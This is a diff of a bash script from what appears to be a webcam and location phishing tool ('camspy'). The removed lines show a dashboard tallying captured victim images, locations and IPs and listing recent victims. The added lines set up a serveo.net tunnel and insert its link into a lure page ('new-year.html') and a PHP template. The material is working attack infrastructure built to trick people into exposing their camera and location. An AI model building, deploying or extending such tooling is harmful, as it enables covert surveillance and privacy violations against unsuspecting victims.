-                echo -e "    ${COLORS[WHITE]}  ${ICON_LOCATION} Locations captured: $location_count${COLORS[RESET]}"
-            fi
-            
-            # Images
-            local image_count=$(ls cam_*.png 2>/dev/null | wc -l)
-            echo -e "    ${COLORS[WHITE]}  ${ICON_CAMERA} Images captured: $image_count${COLORS[RESET]}"
-        fi
-        
-        # Show last victim details
-        if [ -f "logs/victim_summary.txt" ]; then
-            echo -e "\n    ${COLORS[MAGENTA]}📋 Last Victim:${COLORS[RESET]}"
-            tail -n 1 logs/victim_summary.txt 2>/dev/null | while read line; do
-                echo -e "    ${COLORS[DIM]}$line${COLORS[RESET]}"
-            done
-        fi
-        
-        echo -e "\n    ${COLORS[DIM]}................................${COLORS[RESET]}"
-        echo -e "    ${COLORS[BLINK]}${COLORS[CYAN]}👁️ Monitoring...${COLORS[RESET]}"
-        echo -e "    ${COLORS[DIM]}..................................${COLORS[RESET]}"
-        
-        sleep 3
-    done
+payload() {
+    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+    sed 's+forwarding_link+'$send_link'+g' new-year.html > index2.html
+    sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 }
 
-# Function to show statistics
-show_stats() {
-    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}    📊 CAMPAIGN STATISTICS${COLORS[RESET]}"
-    echo -e "    ${COLORS[DIM]}══════════════════════════════════════${COLORS[RESET]}"
-    
-    # Total victims
-    local total_ips=0
-    if [ -f "saved.ip.txt" ]; then
-        total_ips=$(wc -l < saved.ip.txt)
-    fi
-    
-    # Total images
-    local total_images=$(ls cam_*.png 2>/dev/null | wc -l)
-    
-    # Total locations
-    local total_locations=0
-    if [ -f "logs/location_info.txt" ]; then
-        total_locations=$(grep -c "=== LOCATION INFO" logs/location_info.txt)
-    fi
-    
-    # Display stats in a box
-    echo -e "    ${COLORS[CYAN]}................................................${COLORS[RESET]}"
-    echo -e "    ${COLORS[CYAN]}${COLORS[WHITE]}  ${ICON_INFO} Total IPs:      ${COLORS[YELLOW]}$total_ips${COLORS[WHITE]}            ${COLORS[CYAN]}${COLORS[RESET]}"
-    echo -e "    ${COLORS[CYAN]}${COLORS[WHITE]}  ${ICON_CAMERA} Total Images:   ${COLORS[YELLOW]}$total_images${COLORS[WHITE]}            ${COLORS[CYAN]}${COLORS[RESET]}"
-    echo -e "    ${COLORS[CYAN]}${COLORS[WHITE]}  ${ICON_LOCATION} Total Locations: ${COLORS[YELLOW]}$total_locations${COLORS[WHITE]}            ${COLORS[CYAN]}${COLORS[RESET]}"
-    echo -e "    ${COLORS[CYAN]}.....................................................${COLORS[RESET]}"
-    
-    # Show recent victims
-    if [ -f "logs/victim_summary.txt" ]; then
-        echo -e "\n    ${COLORS[MAGENTA]}📋 Recent Victims:${COLORS[RESET]}"
-        echo -e "    ${COLORS[DIM]}────────────────────────${COLORS[RESET]}"
-        tail -n 5 logs/victim_summary.txt 2>/dev/null | while read line; do
-            echo -e "    ${COLORS[WHITE]}$line${COLORS[RESET]}"
-        done
-    fi
-}
+start() {
+    default_choose_sub="Y"
+    default_subdomain="camspy$RANDOM"
 
-# Enhanced cleanup function
-cleanup_and_exit() {
-    echo -e "\n\n${COLORS[YELLOW]}${ICON_STOP} Cleaning up processes...${COLORS[RESET]}"
+    printf "\n    \e[1;97m..........................................................\e[0m\n"
+    printf "    \e[1;97m          \e[1;92m   CUSTOM SUBDOMAIN SETUP    \e[1;97m     \e[0m\n"
+    printf "    \e[1;97m............................................................\e[0m\n"
     
-    # Kill PHP
-    if [ -n "$PHP_PID" ] && kill -0 $PHP_PID 2>/dev/null; then
-        kill $PHP_PID 2>/dev/null
-        echo -e "  ${COLORS[GREEN]}${ICON_CHECK} PHP stopped${COLORS[RESET]}"
-    fi
+    printf "\n    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;95mUse custom subdomain? [\e[1;92mY\e[1;95m/\e[1;91mn\e[1;95m]: \e[0m"
+    read -r choose_sub
+    choose_sub="${choose_sub:-${default_choose_sub}}"
     
-    # Kill tunnel
-    if [ -n "$TUNNEL_PID" ] && kill -0 $TUNNEL_PID 2>/dev/null; then
-        kill $TUNNEL_PID 2>/dev/null
-        echo -e "  ${COLORS[GREEN]}${ICON_CHECK} Tunnel stopped${COLORS[RESET]}"
-    fi
-    
-    # Kill any remaining processes
-    pkill -f php 2>/dev/null
-    pkill -f cloudflared 2>/dev/null
-    pkill -f ngrok 2>/dev/null
-    pkill -f ssh 2>/dev/null
-    
-    echo -e "\n${COLORS[GREEN]}${ICON_SUCCESS} Cleanup complete!${COLORS[RESET]}"
-    log_message "INFO" "Script terminated cleanly"
-    
-    # Show final stats
-    show_stats
-    
-    exit 0
-}
-
-# Main function
-main() {
-    # Show banner
-    show_banner
-    
-    # Log start
-    log_message "INFO" "Script started - Version $SCRIPT_VERSION"
-    
-    # Check dependencies
-    check_dependencies
-    
-    # Show main menu
-    while true; do
-        show_main_menu
-        read -r choice
+    if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "yes" ]]; then
+        subdomain_resp=true
+        printf "    \e[1;97m[\e[1;96m?\e[1;97m] \e[1;95mEnter subdomain [\e[1;93m%s\e[1;95m]: \e[0m" "$default_subdomain"
+        read -r subdomain
+        subdomain="${subdomain:-${default_subdomain}}"
         
-        case $choice in
-            1)
-                echo -e "\n${COLORS[GREEN]}Selected: Cloudflared${COLORS[RESET]}"
-                start_cloudflared
-                if [ $? -eq 0 ]; then
-                    monitor_victims
-                fi
-                ;;
-            2)
-                echo -e "\n${COLORS[YELLOW]}Selected: Serveo.net${COLORS[RESET]}"
-                # Add serveo function here
-                echo -e "${COLORS[RED]}Coming soon...${COLORS[RESET]}"
-                sleep 2
-                ;;
-            3)
-                echo -e "\n${COLORS[BLUE]}Selected: Ngrok${COLORS[RESET]}"
-                # Add ngrok function here
-                echo -e "${COLORS[RED]}Coming soon...${COLORS[RESET]}"
-                sleep 2
-                ;;
-            4)
-                echo -e "\n${COLORS[MAGENTA]}Selected: Localhost Only${COLORS[RESET]}"
-                echo -e "${COLORS[YELLOW]}${ICON_WARN} Localhost is only accessible on this device${COLORS[RESET]}"
-                # Start local PHP server
-                php -S 0.0.0.0:8080 -t forwarding_link/
-                ;;
-            5)
-                echo -e "\n${COLORS[RED]}Exiting...${COLORS[RESET]}"
-                cleanup_and_exit
-                ;;
-            *)
-                echo -e "\n${COLORS[RED]}${ICON_ERROR} Invalid option!${COLORS[RESET]}"
-                sleep 2
-                ;;
-        esac
-    done
+        # Animated subdomain confirmation
+        printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mSubdomain set: \e[1;96m%s.serveo.net\e[0m\n" "$subdomain"
+    else
+        subdomain_resp=false
+        printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mUsing random subdomain\e[0m\n"
+    fi
+
+    server
+    payload
+    checkfound
 }
 
-# Run main function
-main
+# Main execution
+animate_banner
+banner
+dependencies
+start1
